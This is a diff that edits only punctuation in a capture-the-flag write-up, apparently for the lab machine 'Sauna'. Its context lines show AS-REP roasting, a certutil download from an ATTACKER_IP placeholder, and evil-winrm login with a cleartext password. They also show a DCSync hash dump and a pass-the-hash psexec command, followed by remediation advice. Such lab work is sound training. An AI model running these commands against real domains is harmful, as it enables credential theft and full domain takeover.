@@ -66,7 +66,7 @@ impacket-GetNPUsers egotistical-bank.local/ -usersfile users.txt -dc-ip 10.129.9
 
 ![AS-REP roast attempt against the generated username list](06-asrep-roast-attempt.png)
 
-Got a hash for the `fsmith` user — pre-authentication was disabled on
+Got a hash for the `fsmith` user, pre-authentication was disabled on
 that account. Cracked it offline:
 
 ```bash
@@ -98,7 +98,7 @@ certutil -urlcache -split -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
 
 ![WinPEAS finding AutoLogon credentials](08-autologon-creds-found.png)
 
-WinPEAS flagged **AutoLogon credentials** configured on the box —
+WinPEAS flagged **AutoLogon credentials** configured on the box,
 `svc_loanmanager` with its password stored in cleartext in the registry.
 AutoLogon is meant for convenience, not security, and it leaves a
 plaintext credential sitting in `HKLM\...\Winlogon` for anyone with local
@@ -113,7 +113,7 @@ evil-winrm -i 10.129.8.203 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
 ```
 
 In BloodHound, `svc_loanmgr` has the **`GetChangesAll`** extended right on
-the domain — DCSync rights:
+the domain, DCSync rights:
 
 ![BloodHound showing svc_loanmgr's GetChangesAll on the domain](09-bloodhound-getchanges.png)
 
@@ -126,7 +126,7 @@ impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.8.203
 ![secretsdump dumping domain hashes via DCSync](10-secretsdump-hashes.png)
 
 Confirmed the hash worked with `crackmapexec`, then used it directly with
-`psexec` (pass-the-hash — no need for a plaintext password):
+`psexec` (pass-the-hash, no need for a plaintext password):
 
 ```bash
 impacket-psexec egotistical-bank.local/administrator@10.129.8.203 -hashes <NTLM_HASH>:<NTLM_HASH>
@@ -139,16 +139,16 @@ Domain Admin, root flag retrieved.
 ## Lessons Learned
 
 - A company's own "About us" / team page is a legitimate username source
-  — real names map to predictable AD username conventions more often than
+, real names map to predictable AD username conventions more often than
   not.
 - AS-REP Roasting is worth trying against *any* generated username list
   before committing to a password spray, since it can't trigger a
   lockout.
-- AutoLogon registry keys are a recurring, easy privesc win on Windows —
-  always worth an automated check (WinPEAS or equivalent) rather than
+- AutoLogon registry keys are a recurring, easy privesc win on Windows.
+  Always worth an automated check (WinPEAS or equivalent) rather than
   manual searching.
 - DCSync rights can end up on an ordinary-looking service account, not
-  just Domain Admins — BloodHound is the only reliable way to see who
+  just Domain Admins, BloodHound is the only reliable way to see who
   actually holds them.
 
 ---
@@ -156,11 +156,11 @@ Domain Admin, root flag retrieved.
 ## Remediation
 
 - Don't list full employee names publicly if usernames follow a
-  predictable pattern derived from them — or at least don't reuse that
+  predictable pattern derived from them, or at least don't reuse that
   pattern for AD accounts.
 - Enable Kerberos pre-authentication on every account.
-- Never configure AutoLogon with a plaintext password in the registry;
-  use a credential vault or managed service account instead.
+- Never configure AutoLogon with a plaintext password in the registry.
+  Use a credential vault or managed service account instead.
 - Restrict DCSync (`GetChanges`/`GetChangesAll`) rights to actual domain
   controller computer accounts, and audit regularly.
 
